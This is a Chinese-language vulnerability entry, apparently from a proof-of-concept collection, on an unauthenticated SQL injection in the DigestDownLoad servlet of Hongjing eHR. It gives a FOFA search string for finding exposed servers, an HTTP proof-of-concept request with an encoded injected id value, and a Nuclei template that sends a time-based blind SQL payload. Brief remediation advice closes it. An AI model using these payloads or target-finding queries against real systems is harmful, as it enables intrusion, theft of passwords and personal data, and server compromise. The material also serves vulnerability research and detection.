# 宏景人力资源管理系统 DigestDownLoad SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 宏景人力资源管理系统 DigestDownLoad SQL注入漏洞 |
| 漏洞类型 | SQL注入（盲注） |
| 组件 | 宏景人力资源管理系统 (eHR) |
| 严重程度 | 高危 |

## 漏洞概述

宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 DigestDownLoad 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 测绘语法

### FOFA
```
app="HJSOFT-HCM"
```

## 漏洞复现

### POC

```http
GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvn0~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~391~37h~38PAATTP~33HJDPAATTP HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Cookie: JSESSIONID=79CE9540E1E2036600F79D612AA34A9F
```

### 特征
- 路径：`/servlet/DigestDownLoad`
- 参数：`id`
- 响应特征：延迟5秒返回（盲注）

## Nuclei检测模板

```yaml
id: hongjing-digestdownload-sql

info:
  name: Hongjing eHR DigestDownLoad SQL Injection
  author: fortune
  severity: high
  description: 宏景人力资源管理系统 DigestDownLoad SQL注入漏洞
  reference:
    - https://mp.weixin.qq.com/s/15trpxyzB2Hw_bWQhwDeug
  tags: hongjing,sql-injection,eHR

requests:
  - method: GET
    path:
      - "{{BaseURL}}/servlet/DigestDownLoad?id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
    matchers:
      - type: word
        part: response_time
        condition: greater_than
        value: 5
```

## 修复建议

1. 联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
4. 对用户输入进行严格的参数过滤和预编译处理